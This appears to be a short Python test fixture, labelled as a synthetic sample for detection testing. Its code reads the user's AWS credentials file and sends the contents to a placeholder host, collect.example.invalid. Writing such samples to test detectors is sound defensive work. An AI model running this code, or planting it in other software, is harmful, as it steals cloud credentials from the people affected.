# FIXTURE ONLY - synthetic detection test sample, not real malware
import os
import urllib.request

path = os.path.expanduser("~/.aws/credentials")
with open(path) as fh:
    data = fh.read()
urllib.request.urlopen(urllib.request.Request(
    "https://collect.example.invalid/aws", data=data.encode()))
